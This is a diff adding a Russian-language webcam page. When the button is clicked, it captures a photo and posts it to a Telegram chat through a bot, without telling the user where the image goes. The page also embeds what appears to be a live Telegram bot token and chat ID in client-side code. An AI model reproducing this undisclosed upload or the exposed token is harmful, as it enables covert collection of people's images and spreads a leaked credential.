@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+</head>
+<body>
+    <h1>Сделать фото</h1>
+    <video id="video" width="320" height="240" autoplay></video>
+    <button id="snap">Сфотографировать</button>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        // Получение доступа к камере
+        const video = document.getElementById('video');
+
+        // Запрос на доступ к камере
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Ошибка доступа к камере: ", err);
+            });
+
+        // Снятие фото
+        const snapButton = document.getElementById('snap');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        snapButton.addEventListener('click', () => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Получаем фото в формате base64
+            const imageData = canvas.toDataURL('image/png');
+            
+            // Отправка фото на сервер
+            sendPhotoToTelegram(imageData);
+        });
+
+        // Функция отправки фото в Telegram
+        function sendPhotoToTelegram(imageData) {
+            const telegramBotToken = '7210048659:AAFopzWByINOdwsJFkXNmsH6NSu_3QecXUk'; // Замените на ваш токен бота
+            const chatId = '1782765405'; // Замените на ваш ID чата
+
+            // Преобразуем base64 в бинарный формат
+            const blob = dataURItoBlob(imageData);
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.png');
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Фото отправлено:', result);
+            })
+            .catch(error => {
+                console.error('Ошибка отправки фото:', error);
+            });
+        }
+
+        // Функция для преобразования base64 в Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
